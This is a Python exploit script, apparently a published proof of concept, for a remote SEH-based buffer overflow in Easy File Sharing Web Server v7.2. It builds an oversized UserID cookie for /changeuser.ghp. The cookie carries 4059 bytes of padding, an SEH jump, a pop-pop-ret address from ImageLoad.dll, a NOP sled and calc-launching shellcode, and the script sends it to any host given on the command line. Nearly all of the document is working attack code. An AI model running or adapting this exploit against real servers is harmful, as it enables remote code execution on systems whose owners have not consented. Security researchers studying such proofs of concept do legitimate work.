#!/usr/bin/env python
# Easy File Sharing Web Server v7.2 Remote SEH Based Overflow
# The buffer overwrites ebx with 750+ offset, when sending 4059 it overwrites the EBX
# vulnerable file /changeuser.ghp > Cookies UserID=[buf]
# Means there are two ways to exploit changeuser.ghp
# Tested on Win7 x64 and x86, it should work on win8/win10
# By Audit0r
# https://twitter.com/Audit0rSA


import sys, socket, struct
 

if len(sys.argv) <= 1:
    print "Usage: python efsws.py [host] [port]"
    exit()
 
host = sys.argv[1]    
port = int(sys.argv[2])


# https://code.google.com/p/win-exec-calc-shellcode/
shellcode = (

"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9" +

"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56" +

"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9" +

"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97" +

"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64" +

"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8" +

"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a" +

"\x1c\x39\xbd"

)

print "[+]Connecting to" + host


craftedreq =  "A"*4059

craftedreq += "\xeb\x06\x90\x90"     		 # basic SEH jump

craftedreq += struct.pack("<I", 0x10017743)      # pop commands from ImageLoad.dll                         

craftedreq += "\x90"*40                          # NOPer

craftedreq += shellcode                         

craftedreq += "C"*50                             # filler



httpreq = (

"GET /changeuser.ghp HTTP/1.1\r\n"

"User-Agent: Mozilla/4.0\r\n"

"Host:" + host + ":" + str(port) + "\r\n"

"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"

"Accept-Language: en-us\r\n"

"Accept-Encoding: gzip, deflate\r\n"

"Referer: http://" + host + "/\r\n"

"Cookie: SESSIONID=6771; UserID=" + craftedreq + "; PassWD=;\r\n"

"Conection: Keep-Alive\r\n\r\n"
)


print "[+]Sending the Calc...."

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

s.send(httpreq)

s.close()